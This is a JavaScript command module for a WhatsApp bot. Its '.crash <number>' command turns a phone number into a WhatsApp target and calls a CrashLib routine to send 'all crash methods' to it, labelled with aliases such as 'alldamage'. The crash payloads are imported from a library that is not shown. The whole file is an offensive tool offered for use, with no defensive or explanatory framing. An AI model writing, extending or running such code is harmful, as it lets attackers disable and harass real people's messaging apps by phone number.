'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'crash',
    aliases: ['crashall', 'executeall', 'alldamage'],
    category: 'crash',
    desc: 'ᴇxᴇᴄᴜᴛᴇ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
    usage: '.crash <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || msg.chat;
        
        let crashLib = global.getCrashLib?.();
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '💣 ᴇxᴇᴄᴜᴛɪɴɢ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs...' }, { quoted: msg });
        
        try {
            await crashLib.executeAll(target, msg);
            return sock.sendMessage(ctx.from, { text: '✅ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};